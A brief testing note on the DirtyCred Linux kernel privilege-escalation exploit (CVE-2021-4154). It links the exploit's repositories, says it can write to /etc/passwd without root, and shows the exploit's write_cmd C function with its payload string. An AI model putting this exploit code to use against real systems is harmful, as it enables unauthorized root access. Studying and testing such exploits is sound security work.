# Testing 'DirtyCred' - CVE-2021-4154

<https://github.com/markakd/dirtycred>

<https://github.com/Markakd/CVE-2021-4154>

This was a linux kernel exploit that can write to /etc/passwd without root privileges. 

You can change the data being written in the write_cmd function.

```c
void *write_cmd() {
  char data[1024] = "\nDirtyCred works!\n\n";
  struct iovec iov = {.iov_base = data, .iov_len = strlen(data)};

  while (!run_write) {
  }
  run_spray = 1;
  if (writev(uaf_fd, &iov, 1) < 0) {
    printf("failed to write\n");
  }
  printf("[*] overwrite done! It should be after the slow write\n");
}
```
